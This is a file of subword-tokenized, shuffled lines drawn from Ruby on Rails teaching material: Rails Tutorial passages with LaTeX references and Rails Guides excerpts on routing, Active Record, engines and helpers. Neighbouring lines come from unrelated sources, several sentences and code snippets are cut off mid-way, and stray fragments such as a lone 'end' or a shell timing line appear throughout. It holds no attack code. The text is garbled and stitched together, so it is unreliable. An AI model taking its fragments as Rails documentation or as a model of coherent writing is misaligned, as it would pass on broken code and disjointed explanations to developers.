▁N a v ig ating ▁to ▁his ▁ home ▁page , ▁ Calvin ▁now ▁see s ▁an ▁ increment ed ▁`` following '' ▁count ▁and ▁find s ▁ Hobbes ' s ▁microposts ▁in ▁his ▁status ▁feed ▁( Figure ~\ ref { fig : page _ flow _ home _ page _ feed _ mockup }) .
▁But ▁wait --- action s ▁don ' t ▁have ▁return ▁values , ▁at ▁least ▁not ▁one s ▁that ▁matter .
▁You ▁can ▁also ▁define ▁other ▁defaults ▁in ▁a ▁route ▁by ▁supply ing ▁a ▁hash ▁for ▁the ▁`: default s ` ▁option ▖
▁The ▁ v i ▁editor ▁is ▁one ▁of ▁the ▁most ▁an ci ent ▁yet ▁powerful ▁we a p on s ▁in ▁the ▁Unix ▁a rs en al , ▁and ▁ V im ▁is ▁`` v i ▁improve d '' .
▁ Example :
▁You ▁can ▁use ▁a ▁shorthand ▁syntax ▁for ▁rendering ▁collection s ▖
▁If ▁` config ▖ action _ dispatch ▖ show _ exception s ` ▁is ▁set ▁to ▁` false `, ▁exception s ▁will ▁be ▁raised ▁regardless .
▁We ' ll ▁learn ▁more ▁about ▁HTTP ▁request ▁methods ▁starting ▁in ▁Section ~\ ref { sec : getting _ started _ with _ testing } .
▁If ▁you ▁wish ▁to ▁use ▁an ▁initializer ▁- ▁code ▁that ▁should ▁run ▁before ▁the ▁engine ▁is ╼ load ed ▁- ▁the ▁place ▁for ▁it ▁is ▁the ▁` config / initializers ` ▁folder ▖
▁#### ▁Name d ▁date s
▁* ▁` Rack :: Runtime ` ▁set s ▁an ▁` X - Runtime ` ▁header , ▁containing ▁the ▁time ▁( in ▁second s ) ▁taken ▁to ▁execute ▁the ▁request .
▁@ ips ▁= ▁ Blacklist ▖ re t ri e ve _ ips
▁With ▁` includes `, ▁Active ▁Record ▁ensure s ▁that ▁all ▁of ▁the ▁specified ▁associations ▁are ▁loaded ▁using ▁the ▁ minimum ▁possible ▁number ▁of ▁queries .
▁Of ficial ly ▁ pronoun c ed ▁`` ess - c ue - e ll - ite '' , ▁a lthough ▁the ▁( mis ) p r on un ci ation ▁`` s equ el - ite '' ▁is ▁also ▁common .
▁With ▁the ▁status ▁feed ▁design ▁requirements ▁capture d ▁in ▁the ▁test ▁from ▁Listing ~\ ref { code : full _ feed _ test }, ▁we ' re ▁ready ▁to ▁start ▁writing ▁the ▁feed .
▁To ▁secure ▁the ▁site ▁properly , ▁we ▁also ▁need ▁access ▁control ▁on ▁the ▁\ k ode { destroy } ▁action , ▁so ▁that ▁\ emph { only } ▁admin s ▁can ▁delete ▁users .
▁User Mailer ▖ welcome (@ user )▖ deliver _ now
▁╼╼ ▁test ▁" should ▁get ▁help " ▁do ╼ ▁get ▁: help ╼ ▁ assert _ response ▁: success ╼ ▁ assert _ select ▁" title ", ▁" Help
▁as ▁show n ▁in ▁Listing ~\ ref { code : email _ downcase } .
▁If ▁you ▁want ▁a ▁variable ▁to ▁contain ▁a ▁literal ▁back slash , ▁single ▁ quot es ▁make ▁it ▁easier :
▁This ▁prevent s ▁storing ▁the ▁ forwarding ▁URL ▁if ▁a ▁user , ▁say , ▁submit s ▁a ▁form ▁when ▁not ▁logged ▁in ▁( which ▁is ▁an ▁ ed ge ▁case ▁but ▁could ▁happen ▁if , ▁e ▖ g ▖ , ▁a ▁user ▁delete d ▁the ▁session ▁cookies ▁by ▁hand ▁before ▁ submitting ▁the ▁form ) .
▁ W h y ▁Associations ?
▁or , ▁for ▁a ▁single ▁case :
▁An ▁integration ▁test ▁for ▁password ▁resets .
▁You ▁can ▁ still ▁use ▁the ╼` : message ` ▁option ▁to ▁specify ▁an ▁error ▁message .
▁For ▁example , ▁ MySQL ▁has ▁an ▁expression ▁called ▁` LO C K ▁ IN ▁S HA RE ▁M O D E ` ▁where ▁you ▁can ▁ lock ▁a ▁record ▁but ▁ still ▁allow ▁other ▁queries ▁to ▁read ▁it ▖
▁ Contribut ing ▁to ▁the ▁Rails ▁Documentation
▁Application ▁log ▁files
▁| ▁GET ▁| ▁ / photos / new ▁| ▁images # new ▁| ▁new _ photo _ path ▁|
▁For ▁example , ▁you ▁can ▁use ▁this ▁technique ▁to ▁reduce ▁duplication ▁between ▁new ▁and ▁edit ▁pages , ▁while ▁ still ▁keep ing ▁a ▁bit ▁of ▁ distinct ▁content :
▁### ▁` valid ?` ▁and ▁` invalid ?
▁It ▁then ▁tests ▁that ▁the ▁page ▁content ▁and ▁title ▁both ▁contain ▁the ▁user ' s ▁name .
▁ Adding ▁code ▁for ▁a ▁ pretty ▁debug ▁ box , ▁including ▁a ▁Sass ▁ mixin .
▁This ▁is ▁done ▁via ▁the ▁JavaScript ▁file ▁` jquery _ ujs `╼ which ▁is ▁automatically ▁included ▁into ▁your ▁application ' s ▁layout ╼ ( ` app / views / layouts / application ▖ html ▖ erb ` ) ▁when ▁you ▁generated ▁the ▁application ▖╼
▁As ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby }, ▁our ▁tool ▁of ▁choice ▁for ▁explor ing ▁data ▁models ▁is ▁the ▁Rails ▁console .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / anonymous ▖ rb ` .
▁ Engine s ▁can ▁be ▁consider ed ▁ mini at ure ▁applications ▁that ▁provide ▁functionality ▁to ╼ the ir ▁host ▁applications ▖
▁# ▁Run s ▁all ▁the ▁validations ▁within ▁the ▁specified ▁context .
▁ logout _ path
▁@ customer ▁= ▁@ order ▖ build _ customer ( customer _ number : ▁ 123 ,
▁Tests ▁for ▁delete ▁links .
▁use ▁ ActionDispatch :: Static
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁class ▁ Third Part y Library :: C raw ler
▁< pre ▁class =' debug _ dump ' > ---
▁#### ▁ Trans form ation
▁We ' re ▁now ▁in ▁a ▁position ▁to ▁start ▁implement ing ▁our ▁signin ▁model , ▁name ly , ▁remember ing ▁user ▁signin ▁status ▁`` for ever '' ▁and ▁end ing ▁the ▁session ▁only ▁when ▁the ▁user ▁explicitly ▁sign s ▁out .
▁At ▁this ▁point , ▁our ▁deletion ▁code ▁is ▁well - test ed , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁Fin ally , ▁we ' ll ▁write ▁an ▁integration ▁test ▁to ▁log ▁in , ▁check ▁the ▁micropost ▁pagination , ▁make ▁an ▁invalid ▁submission , ▁make ▁a ▁valid ▁submission , ▁delete ▁a ▁post , ▁and ▁then ▁visit ▁a ▁second ▁user ' s ▁page ▁to ▁make ▁sure ▁there ▁are ▁no ▁`` delete '' ▁links .
▁As ▁a ▁result , ▁evaluat ion ▁f all s ▁off ▁the ▁end ▁of ▁the ▁\ k ode { current \_ user } ▁method , ▁there by ▁return ing ▁\ k ode { nil } ▁as ▁required .
▁But ▁there ▁are ▁two ▁p erhaps ▁more ▁ idiomatic ally ▁correct ▁ways ▁to ▁define ▁class ▁methods , ▁one ▁slightly ▁confusing ▁and ▁one ▁ extremely ▁confusing .
▁A ▁partial ▁to ▁render ▁a ▁single ▁user .
▁scope ▁: published , ▁-> ▁ { ▁where ( published : ▁true ) ▁ }
▁Whi ch ever ▁option ▁you ▁choose , ▁I ▁recommend ▁running ▁the ▁\ k ode { rails ▁server } ▁command ▁in ▁a ▁second ▁terminal ▁ tab ▁so ▁that ▁you ▁can ▁ still ▁issue ▁commands ▁in ▁the ▁first ▁ tab , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : new _ term in al _ tab } ▁and ▁Figure ~\ ref { fig : rails _ server _ new _ tab } .
▁T hough ▁of ▁ n ec ess ity ▁our ▁effort s ▁will ▁focus ▁on ▁this ▁specific ▁sample ▁application , ▁the ▁emphasi s ▁throughout ▁the ▁\ emph { Rails ▁Tutorial } ▁will ▁be ▁on ▁general ▁principle s , ▁so ▁that ▁you ▁will ▁have ▁a ▁so li d ▁foundation ▁no ▁matter ▁what ▁kind s ▁of ▁web ▁applications ▁you ▁want ▁to ▁build .
▁ Adding ▁the ▁CSS ▁for ▁the ▁site ▁ footer .
▁And ▁you ▁can ▁tell ▁the ▁method ▁not ▁to ▁fill ▁the ▁small er ▁ groups ▁passing ▁` false `:
▁def ▁comment _ params
▁Also ▁we ▁common ly ▁want ▁to ▁set ▁` max - age ` ▁which ▁is ▁how ▁long ╼ the ▁cache ▁will ▁store ▁the ▁object ▁before ▁invalid ating ▁the ▁cache ▖
▁Be ▁careful ▁about ▁using ▁the ▁\ k ode { - a } ▁flag ▁ im p r o p er ly ; ▁if ▁you ▁have ▁added ▁any ▁new ▁files ▁to ▁the ▁project ▁since ▁the ▁last ▁commit , ▁you ▁ still ▁have ▁to ▁tell ▁Git ▁about ▁them ▁using ▁\ k ode { git ▁add ▁- A } ▁first .
▁Because ▁HTTP ▁is ▁a ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # HTTP _ session _ state }{\ emph { state less ▁protocol } }, ▁web ▁applications ▁ requiring ▁user ▁signin ▁must ▁implement ▁a ▁way ▁to ▁ track ▁each ▁user ' s ▁pro gr ess ▁from ▁page ▁to ▁page .
▁in ▁Listing ~\ ref { code : initial _ signup _ test } .
▁H app ily , ▁the ▁form ▁variable ~\ k ode { f } ▁can ▁access ▁the ▁ associated ▁object ▁through ▁\ k ode { f ▖ object }, ▁so ▁that ▁in
▁instead ▁of ▁the ▁equivalent ▁code
▁person ▖ errors ▖ size ▁# ▁=> ▁0
▁ attr _ accessor ▁: author _ name
▁It ▁uses ▁the ╼` blank ?` ▁method ▁to ▁check ▁if ▁the ▁value ▁is ▁either ▁` nil ` ▁or ▁a ▁blank ▁string , ▁that ╼ is , ▁a ▁string ▁that ▁is ▁either ▁empty ▁or ▁consist s ▁of ▁whitespace .
▁* ▁`: delete _ all ` ▁cause s ▁all ▁the ▁ associated ▁objects ▁to ▁be ▁delete d ▁directly ▁from ▁the ▁database ▁( so ▁callbacks ▁will ▁not ▁execute )
▁C on ve n i ent ly , ▁a ▁Sessions ▁helper ▁module ▁was ▁generated ▁automatically ▁when ▁ generating ▁the ▁Sessions ▁controller ▁( Section ~\ ref { sec : sessions _ controller }) .
▁In ▁the ▁console ▁session ▁in ▁Section ~\ ref { sec : a _ user _ class }, ▁we ▁created ▁a ▁new ▁user ▁object ▁with ▁\ k ode { User ▖ new }, ▁which ▁we ▁ha d ▁access ▁to ▁only ▁after ▁ requiring ▁the ▁example ▁user ▁file ▁in ▁Listing ~\ ref { code : example _ user } .
▁The ▁model ▁tests ▁should ▁now ▁be ▁\ passing :
▁| ▁JSON ▁| ▁Parameters ▁|
▁You ▁can ▁use ▁these ▁tags ▁in ▁ layouts ▁or ▁other ▁views , ▁a lthough ▁the ▁` auto _ discover y _ link _ tag `, ▁` javascript _ include _ tag `, ▁and ▁` stylesheet _ link _ tag `, ▁are ▁most ▁common ly ▁used ▁in ▁the ▁`< head >` ▁section ▁of ▁a ▁layout .
▁</ header >
▁To ▁fix ▁this , ▁we ▁simply ▁update ▁the ▁two ▁cases ▁to ▁use ▁the ▁ generalized ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : generalized _ current _ user } ▁and ▁Listing ~\ ref { code : test _ authenticated _ invalid _ token _ updated } .
▁A ▁JavaScript ▁file ▁within ▁a ▁Rails ▁application ▁or ▁Rails ▁engine ▁go es ▁in ▁one ▁of ▁three ▁location s : ▁` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets ` ▖
▁The ▁association ▁between ▁microposts ▁and ▁users .
▁Also ,╼ creating ▁an ▁application ▁with ▁the ▁`-- skip - sprockets ` ▁option ▁will ▁generate ╼ a ▁slightly ▁different ▁` config / application ▖ rb ` ▁file , ▁with ▁a ▁require ▁statement ╼ for ▁the ▁ sprockets ▁ ra i lt i e ▁that ▁is ▁comment ed - out ▖
▁This ▁ essentially ╼ me an s ▁that ▁the ▁application ▁and ▁its ▁engines ▁can ▁have ▁identical ly ▁named ▁routes ▁and ╼ the y ▁will ▁not ▁c la sh .
▁In ▁this ▁case , ▁though , ▁such ▁a ▁test ▁involve s ▁sever al ▁new ▁idea s , ▁so ▁for ▁now ▁it ' s ▁best ▁def er r ed ▁to ▁its ▁own ▁section ▁( Section ~\ ref { sec : layout _ link _ tests }) .
▁### ▁Under st and ing ▁ Middleware s
▁* ▁` has _ many `
▁( TextMate , ▁which ▁is ▁available ▁only ▁on ▁OS ~ X , ▁is ▁ still ▁a ▁good ▁choice ▁if ▁you ▁use ▁a ▁M ac ▖)
▁d c : creator ", ▁item ▖ author _ name ) ▁if ▁item _ has _ creator ?(
▁T e ▁method ▁` to _ formatted _ s ` ▁provides ▁a ▁default ▁specifie r ▁of ▁" F "▖
▁* ▁` config ▖ active _ record ▖ pluralize _ table _ name s ` ▁specifie s ▁whether ▁Rails ▁will ▁look ▁for ▁ singular ▁or ▁plural ▁table ▁names ▁in ▁the ▁database ▖
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ s ▁# ▁=> ▁" 5▖0 "
▁H a ve ▁a ▁look ▁at ▁[ send _ file ]( http :// api ▖ rubyonrails ▖ org / classes / ActionController / Data S tr ea m ing ▖ html # method - i - send _ file )╼ on ▁how ▁to ▁use ▁this ▁feature .
▁It ▁can ▁be ▁convenient ▁to ▁set ▁it ▁to ▁false ▁for ▁testing .
▁Using ▁RSpec
▁Having ▁ developed ▁the ▁User ▁model ▁and ▁the ▁signup ▁functionality , ▁now ▁is ▁a ▁good ▁time ▁to ▁deploy ▁the ▁sample ▁application ▁to ▁production .
▁Time ▖ zone _ default
▁Model s ▁in ▁Rails ▁use ▁a ▁ singular ▁name , ▁and ▁their ▁corresponding ▁database ▁table s ╼ use ▁a ▁plural ▁name ▖
▁# ▁Do ▁any ▁initialization ▁here
▁in ▁Listing ~\ ref { code : signin _ success _ tests } .
▁* ▁The ▁Ruby ▁on ▁Rails ▁security ▁project ▁posts ▁security ▁new s ▁regular ly : ▁[ http :// www ▖ r or security ▖ info ]( http :// www ▖ r or security ▖ info )
▁WARNING : ▁This ▁guide ▁ assumes ▁a ▁working ▁ knowledg e ▁of ▁Rack ▁protocol ▁and ▁Rack ▁ concept s ▁such ▁as ▁middleware s , ▁url ▁map s ▁and ▁` Rack :: Builder ` .
▁By ▁default , ▁this ▁is ▁defined ▁as :
▁Note ▁here ▁that ▁the ▁routes ▁are ▁d raw n ▁upon ▁the ▁` Blorgh :: Engine ` ▁object ▁rather ▁than ╼ the ▁` You r App :: Application ` ▁class ▖
▁If ▁your ▁test ▁suite ▁is ▁mysterious ly ▁break ing , ▁be ▁sure ▁to ▁try ▁running ▁\ k ode { rake ▁test : prepare } ▁to ▁see ▁if ▁that ▁fix es ▁the ▁problem ▖)
▁Otherwise ▁the ▁exception ▁is ▁re raise d :
▁Tests ▁for ▁email ▁format ▁validation ▖
▁The ▁normal ly ▁hidden ▁\ k ode { ▖ gitignore } ▁file ▁made ▁ visible .
▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes } .
▁In ▁this ▁section , ▁we ' ll ▁add ▁links ▁to ▁delete ▁users , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : user _ index _ delete _ links _ mockup }, ▁and ▁define ▁the ▁\ k ode { destroy } ▁action ▁necessary ▁to ▁accomplish ▁the ▁deletion .
▁ //= ▁require ▁ phone box
▁The ▁method ▁` in _ groups _ of ` ▁ split s ▁an ▁array ▁into ▁con sec u tive ▁ groups ▁of ▁a ▁certain ▁size ▖
▁No ▁style ▁or ▁layout .
▁E ll ips is ▁can ▁be ▁customize d ▁with ▁the ▁`: o mis s ion ` ▁option :
▁It ' s ▁even ▁possible ▁to ▁use ▁` exists ?` ▁without ▁any ▁arguments ▁on ▁a ▁model ▁or ▁a ▁relation .
▁Action
▁Having ▁created ▁a ▁fixture ▁with ▁a ▁valid ▁user , ▁we ▁can ▁retrieve ▁it ▁inside ▁a ▁test ▁as ▁follows :
▁As ▁mentioned ▁in ▁Section ~\ ref { sec : up _ and _ running }, ▁I ▁recommend ▁that ▁users ▁of ▁all ▁operat ing ▁systems ▁( es pecially ▁Windows ) ▁use ▁a ▁cloud ▁development ▁environment ▁( Section ~\ ref { sec : development _ environment }), ▁which ▁comes ▁with ▁a ▁built - in ▁Unix ▁( Linux ) ▁command ▁line .
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ first _ name ▁= ▁' N ic k ') ▁LIMIT ▁1
▁The ▁\ k ode { - m } ▁flag ▁let s ▁you ▁add ▁a ▁message ▁for ▁the ▁commit ; ▁if ▁you ▁omit ▁\ k ode { - m }, ▁Git ▁will ▁open ▁the ▁system ' s ▁default ▁editor ▁and ▁have ▁you ▁enter ▁the ▁message ▁there .
▁A ▁mockup ▁for ▁the ▁most ▁important ▁of ▁these ▁pages , ▁the ▁Home ▁page , ▁appears ▁in ▁Figure ~\ ref { fig : home _ page _ mockup } .
▁We ' ll ▁get ▁started ▁in ▁Chapter ~\ ref { cha : static _ pages } ▁by ▁creating ▁static ▁pages ▁and ▁then ▁add ▁a ▁little ▁dynamic ▁content .
▁The ▁results ▁include ▁h un d r ed s ▁of ▁open - source ▁\ href { http :// contributors ▖ rubyonrails ▖ org /}{ contributors }, ▁well - a tt end ed ▁\ href { http :// rails con f ▖ com /}{ con f er ence s }, ▁a ▁h ug e ▁number ▁of ▁\ href { https :// rubygems ▖ org /}{ gem s } ▁( self - contain ed ▁solution s ▁to ▁specific ▁problem s ▁such ▁as ▁pagination ▁and ▁image ▁upload ), ▁a ▁rich ▁variety ▁of ▁in format ive ▁blog s , ▁and ▁a ▁c or n u co p ia ▁of ▁discussion ▁ forum s ▁and ▁I R C ▁ cha n n el s .
▁### ▁Configur ing ▁Action ▁View
▁* ▁` action _ controller ▖ compile _ config _ methods ` ▁Initialize s ▁methods ▁for ▁the ▁config ▁settings ▁specified ▁so ▁that ▁they ▁are ▁quick er ▁to ▁access .
▁protect _ from _ forgery
▁literal ▁do t
▁#### ▁Using ▁a ▁R ever se ▁ Pro x y
▁The ▁valid ▁format s ▁consist ▁of ▁the ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / Internet _ media _ type } { MIME ▁types } ▁accepted ▁by ▁the ▁validation ▁in ▁Listing ~\ ref { code : validate _ picture _ format } .
▁What ▁if ▁a ▁request ▁to ╼ the ▁server ▁was ▁ craft ed ▁to ▁look ▁like ▁a ▁new ▁article ▁form ▁submit ▁but ▁also ▁included ╼ extra ▁fields ▁with ▁values ▁that ▁violat ed ▁your ▁applications ▁in te gr ity ?
▁Be ▁careful ▁about ▁using ▁the ▁\ k ode { - a } ▁flag ▁ im p r o p er ly ; ▁if ▁you ▁have ▁added ▁any ▁new ▁files ▁to ▁the ▁project ▁since ▁the ▁last ▁commit , ▁you ▁ still ▁have ▁to ▁tell ▁Git ▁about ▁them ▁using ▁\ k ode { git ▁add } ▁first .
▁This ▁will ▁put ▁the ▁` M a g ical :: Uni c or n s ` ▁middleware ▁on ▁the ▁end ▁of ▁the ▁ stack ▖
▁| ▁File ▁| ▁P urpose ▁|
▁We ▁do ▁this ▁with ▁the ▁\ k ode { each } ▁method , ▁display ing ▁each ▁user ' s ▁Gravatar ▁and ▁name , ▁while ▁wrap p ing ▁the ▁whole ▁thing ▁in ▁a ▁\ k ode { ul } ▁tag ▁( Listing ~\ ref { code : user _ index _ view }) .
▁Ou r ▁plan ▁is ▁to ▁define ▁a ▁\ k ode { gravatar \_ for } ▁helper ▁function ▁to ▁return ▁a ▁Gravatar ▁image ▁for ▁a ▁given ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ show _ view _ with _ gravatar } .
▁in ▁Listing ~\ ref { code : nested _ hashes } .
▁@ orders ▖ each ▁do ▁| order |
▁12345678▖ to _ s (: delimited ) ▁# ▁=> ▁12,345,678
▁B oth ▁arrays ▁and ▁ range s ▁respond ▁to ▁a ▁host ▁of ▁methods ▁that ▁accept ▁\ emph { block s }, ▁which ▁are ▁simul t an e ous ly ▁one ▁of ▁Ruby ' s ▁most ▁powerful ▁and ▁most ▁confusing ▁features :
▁In ▁particular , ▁suppose ▁that , ▁in ▁addition ▁to ▁the ▁current ▁attributes , ▁the ▁User ▁model ▁included ▁an ▁\ k ode { admin } ▁attribute ▁used ▁to ▁identify ▁ administrative ▁users ▁of ▁the ▁site .
▁end
▁# ▁=> ▁We d , ▁ 23 ▁No v ▁2011
▁This ▁will ▁update ▁the ▁branch ▁and ▁pull ▁request ▁on ▁GitHub ▁with ▁your ▁new ▁code ▖
▁C lo se ly ▁related ▁to ▁arrays ▁are ▁\ emph { range s }, ▁which ▁can ▁ probably ▁most ▁easily ▁be ▁under st ood ▁by ▁convert ing ▁them ▁to ▁arrays ▁using ▁the ▁\ k ode { to \_ a } ▁method :
▁A ▁ str a ig h for ward ▁implementation ▁look s ▁like ▁this :
▁We ▁defin ite ly ▁don ' t ▁want ▁users ▁to ▁enter ▁a ▁blank ▁password , ▁so ▁we ' ll ▁add ▁another ▁test ▁to ▁validate ▁password ▁presence :
▁resources ▁: cat eg or ies , ▁path : ▁' kategorien '
▁WARNING : ▁This ▁method ▁only ▁works ▁with ▁` INNER ▁JOIN ` .
▁as ▁show n ▁in ▁Listing ~\ ref { code : gitignore _ upload s } .
▁The ▁\ k ode { home } ▁action ▁with ▁a ▁ paginate d ▁feed .
▁" ▁\ n ▁ foo \ n \ r ▁\ t ▁bar ▁\ n "▖ squish ▁# ▁=> ▁" foo ▁bar "
▁| field | ▁record ▖ send ( field ) ▁== ▁" E v i l " ▁ }
▁In ▁` config / environments / development ▖ rb `, ▁place ▁the ▁following ▁line :
▁m attr _ accessor ▁: ex p li c it ly _ un load able _ constant s
▁So ╼ we ▁want ▁to ▁find ▁the ▁client ▁named ▁" Andy ", ▁or ▁if ▁that ▁client ▁doesn ' t ╼ ex ist , ▁create ▁a ▁client ▁named ▁" Andy " ▁which ▁is ▁not ▁ locked .
▁ ╼\ end { code }╼╼ ▁\ subsection { SSL ▁in ▁production } ▁% ▁( fold )╼ ▁\ label { sec : ssl _ in _ production }╼╼
▁If ▁either ▁the ▁: attributes ▁or ▁: tags ▁options ▁are ▁passed , ▁only ▁the ▁mentioned ▁tags ▁and ▁attributes ▁are ▁allow ed ▁and ▁not h ing ▁else .
▁(1▖▖10 ) ▁= == ▁( 3 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁Instead , ▁we ' ll ▁put ▁a ▁message ▁in ▁the ▁flash ▁to ▁be ▁displayed ▁upon ▁failed ▁login .
▁The ▁user ▁profile ▁with ▁un style d ▁microposts .
▁The ▁initial ▁signin ▁view .
▁### ▁` duplicable ?
▁There ' s ▁a ▁lot ▁of ▁code ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁but ▁the ▁only ▁completely ▁no ve l ▁code ▁is ▁in ▁the ▁line
▁In ▁order ▁to ▁make ▁sure ▁users ▁can ' t ▁edit ▁other ▁users ' ▁information , ▁we ▁need ▁to ▁be ▁able ▁to ▁log ▁in ▁as ▁a ▁second ▁user .
▁You ▁must ╼ man u ally ▁add ▁errors ▁to ▁the ▁record ' s ▁errors ▁collection ▁in ▁the ▁validator ▁class .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : basic _ login } ▖)
▁### ▁Using ▁` head ` ▁To ▁Buil d ▁Header - Only ▁ Response s
▁We ' ve ▁seen ▁this ▁pattern ▁before ; ▁the ▁structure ▁close ly ▁parallel s ▁the ▁first ▁version ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : first _ create _ action }) .
▁ Regular ▁files ▁respond ▁to ▁` re w in d ` .
▁in ▁Listing ~\ ref { code : rails _ default _ head } .
▁In ▁order ▁to ▁save ▁the ▁User ▁object ▁to ▁the ▁database , ▁we ▁need ▁to ▁call ▁the ▁\ k ode { save } ▁method ▁on ▁the ▁\ k ode { user } ▁variable :
▁( P lease ▁if ▁you ▁know ▁the ▁exact ▁behavior ▁in ▁1▖9 ▁ contact ▁f x n ▖)
▁#### # ▁` beginning _ of _ year `, ▁` end _ of _ year `
▁You ▁can ▁define ▁a ▁ css ▁rule ▁to ▁make ▁them ╼ st and out .
▁We ' ll ▁see ▁some ▁other ▁examples ▁of ▁Rails ▁addition s ▁to ▁Ruby ▁classes ▁in ▁Section ~\ ref { sec : remember _ me } .
▁# ▁Use ▁ unicorn ▁as ▁the ▁app ▁server
▁Un less ▁you ▁specify ▁a ▁version ▁number ▁to ▁the ▁\ k ode { gem } ▁command , ▁Bundler ▁will ▁automatically ▁install ▁the ▁latest ▁version ▁of ▁the ▁gem .
▁We ▁start ▁with ▁the ▁\ k ode { edit } ▁action , ▁which ▁requires ▁pull ing ▁the ▁relevant ▁user ▁out ▁of ▁the ▁database .
▁The ▁two ▁are ▁ nearly ▁identical , ▁but ▁the ▁latter ▁operator ▁has ▁a ▁high er ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Order _ of _ o p er ation s # Programming _ language s }{\ emph { pre c ed ence } }, ▁which ▁ bind s ▁too ▁t ight ly ▁to ▁\ k ode { root \_ url } ▁in ▁this ▁case .
▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version } .
▁To ▁style ▁the ▁ stats , ▁we ' ll ▁add ▁some ▁ SCSS , ▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ css } ▁( which ▁contains ▁all ▁the ▁stylesheet ▁code ▁needed ▁in ▁this ▁chapter ) .
▁Ou r ▁strategy ▁will ▁be ▁to ▁describe ▁the ▁results ▁of ▁a ▁typical ▁browser ▁hit --- a ▁visit ▁to ▁the ▁user ▁index ▁page ▁at ▁\ href { http ://0▖0▖0▖0:3000/ users }{/ users } --- in ▁terms ▁of ▁ MVC ▁( Figure ~\ ref { fig : mvc _ detailed }) .
▁def ▁log _ info ( sql , ▁name , ▁m s )
▁A ▁mockup ▁of ▁our ▁best ▁guess ▁at ▁the ▁final ▁profile ▁page ▖ ~\ href { http :// railstutorial ▖ org / images / figures / profile _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁This ▁con clu de s ▁our ▁ overview ▁of ▁the ▁Ruby ▁language .
▁U p on ▁ reflection , ▁we ▁see ▁that ▁in ▁these ▁cases ▁the ▁application ▁should ▁either ▁create ▁or ▁destroy ▁a ▁\ emph { relationship } ▁between ▁two ▁users .
▁gem ▁' uglifier ', ▁' > = ▁1▖ 0 ▖ 3 '
▁f
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁will ▁allow ▁all ▁users ▁to ▁update ▁their ▁account ▁information , ▁and ▁we ▁will ▁allow ▁site ▁administrator s ▁to ▁delete ▁users , ▁there by ▁complet ing ▁the ▁full ▁suite ▁of ▁Users ▁resource ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users } .
▁The ▁way ▁to ▁do ▁this ▁is ▁to ▁check ▁the ▁\ emph { count } ▁of ▁users , ▁and ▁under ▁the ▁h ood ▁our ▁tests ▁will ▁use ▁the ▁\ k ode { count } ▁method ▁available ▁on ▁every ▁Active ▁Record ▁class , ▁including ▁\ k ode { User } :
▁def ▁validate _ each ( record , ▁attribute , ▁value )
▁Fin ally , ▁we ▁ migrate ▁the ▁development ▁database ▁and ▁ prepare ▁the ▁test ▁database :
▁config ▖ active _ record ▖ mass _ assignment _ sanitizer ▁= ▁: strict
▁#### ▁date _ field
▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name } .
▁To ▁pull ▁them ▁out ▁in ▁ reverse ▁order , ▁we ▁can ▁push ▁down ▁one ▁level ▁ deep er ▁and ▁include ▁a ▁string ▁with ▁some ▁raw ▁SQL :
▁S ince ▁it ' s ▁so ▁common ▁for ▁hashes ▁to ▁use ▁symbols ▁as ▁keys , ▁Ruby ~ 1 ▖ 9 ▁supports ▁a ▁new ▁syntax ▁just ▁for ▁this ▁special ▁case :
▁* ▁Running ▁` rake ▁ doc : rails ` ▁will ▁put ▁a ▁full ▁copy ▁of ▁the ▁API ▁documentation ▁for ╼ ▁Rails ▁in ▁the ▁` doc / api ` ▁folder ▁of ▁your ▁application ▖
▁ RubyGems ▁is ▁a ▁package ▁ manager ▁for ▁Ruby ▁ projects , ▁and ▁there ▁are ▁many ▁useful ▁libraries ▁( including ▁Rails ) ▁available ▁as ▁Ruby ▁package s , ▁or ▁\ emph { gem s } .
▁The ▁StaticPages ▁controller ▁ spec ▁with ▁a ▁base ▁title .
▁ ╼ ▁$ ▁rails ▁console
▁For t un ate ly , ▁deal ing ▁with ▁a ▁problem ▁like ▁flash ▁ persistence ▁is ▁one ▁of ▁many ▁are as ▁where ▁integration ▁tests ▁really ▁ sh in e ; ▁they ▁let ▁us ▁say ▁exactly ▁what ▁we ▁mean :
▁### ▁Configur ing ▁an ▁ Engine
▁create ▁test / fixtures / blorgh / articles ▖ yml
▁ Scaffold ing ▁is ▁good ▁for ▁getting ▁started ▁quickly ▁but ▁is ▁ bad ▁for ▁understanding .
▁password
▁It ▁returns ▁an ▁array ▁with ▁the ▁ groups :
▁The ▁steps ▁to ▁test ▁password ▁resets ▁br o ad ly ▁parallel ▁the ▁test ▁for ▁account ▁activation ▁from ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁though ▁there ▁is ▁a ▁difference ▁at ▁the ▁out set : ▁we ▁first ▁visit ▁the ▁`` forgot ▁password '' ▁form ▁and ▁submit ▁invalid ▁and ▁then ▁valid ▁email ▁addresses , ▁the ▁latter ▁of ▁which ▁creates ▁a ▁password ▁reset ▁token ▁and ▁send s ▁the ▁reset ▁email .
▁ sy s 	 0 m 0 ▖ 2 58 s
